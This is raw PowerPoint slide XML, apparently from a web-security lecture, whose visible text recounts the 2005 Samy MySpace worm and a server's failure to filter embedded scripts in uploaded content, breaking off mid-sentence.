            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:lnSpc>
                <a:spcPts val="2471"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2118" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C82506"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Key trick</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2118" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>: Server fails to ensure uploaded content does not  contain embedded scripts</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="577059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30823" y="756397"/>
            <a:ext cx="8202706" cy="746808"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="4853" spc="-185" dirty="0"/>
              <a:t>Your </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="4853" spc="40" dirty="0"/>
              <a:t>friend </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="4853" spc="84" dirty="0"/>
              <a:t>and </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="4853" spc="-4" dirty="0"/>
              <a:t>mine, </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="4853" spc="-71" dirty="0"/>
              <a:t>Samy</a:t>
            </a:r>
            <a:endParaRPr sz="4853" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="object 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2332225" y="2010056"/>
            <a:ext cx="130268" cy="258084"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1677" spc="260" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>•</a:t>
            </a:r>
            <a:endParaRPr sz="1677">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="object 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1812686" y="1966632"/>
            <a:ext cx="8191500" cy="353045"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2294" spc="-26" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Samy </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2294" spc="66" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>embedded </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2294" spc="26" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Javascript </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2294" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>in his </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2294" spc="22" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>MySpace </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2294" spc="66" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>page</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2294" spc="-88" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2294" spc="4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>(2005)</a:t>
            </a:r>
            <a:endParaRPr sz="2294" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="object 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2634784" y="2484905"/>
            <a:ext cx="131669" cy="258084"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1677" spc="260" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>•</a:t>
            </a:r>
            <a:endParaRPr sz="1677">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="object 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2351171" y="2437278"/>
            <a:ext cx="7252448" cy="353045"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2294" spc="22" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>MySpace </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2294" spc="4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>servers </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2294" spc="31" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>attempted </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2294" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>to filter it, </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2294" spc="44" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>but</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2294" spc="-62" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2294" spc="22" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>failed</a:t>
            </a:r>
            <a:endParaRPr sz="2294" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="object 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2332225" y="3174066"/>
            <a:ext cx="130268" cy="258084"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1677" spc="260" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>•</a:t>
            </a:r>
            <a:endParaRPr sz="1677">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="object 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1812686" y="3187487"/>
            <a:ext cx="7115735" cy="353045"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2294" spc="4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Users who </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2294" spc="18" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>visited </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2294" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>his </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2294" spc="66" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>page </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2294" spc="4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>ran the </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2294" spc="26" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>program,</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2294" spc="-84" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2294" spc="26" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>which</a:t>
            </a:r>
            <a:endParaRPr sz="2294" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="object 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2634784" y="3650316"/>
            <a:ext cx="131669" cy="258084"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1677" spc="260" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>•</a:t>
            </a:r>
            <a:endParaRPr sz="1677">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="object 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2634784" y="4125166"/>
            <a:ext cx="131669" cy="258084"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1677" spc="260" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>•</a:t>
            </a:r>
            <a:endParaRPr sz="1677">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="object 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2634784" y="4600015"/>
            <a:ext cx="131669" cy="258084"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1677" spc="260" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>•</a:t>
            </a:r>
            <a:endParaRPr sz="1677">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="167948" name="object 12"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2397359" y="3613007"/>
            <a:ext cx="8314184" cy="12305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12700">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2206" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Made them friends with Samy</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:lnSpc>
                <a:spcPct val="137000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="88"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2206" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Displayed “but most of all, Samy is my hero” on profile  Installed script in their profile to propagate</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="object 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2011408" y="5105632"/>
            <a:ext cx="130268" cy="258084"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1677" spc="260" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>•</a:t>
            </a:r>
            <a:endParaRPr sz="1677" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="object 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2141676" y="5058152"/>
            <a:ext cx="5703794" cy="353045"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2294" spc="-40" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>From </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2294" spc="4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>73 </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2294" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>to </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2294" spc="4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>1,000,000 </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2294" spc="22" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>friends </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2294" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>in </a:t>
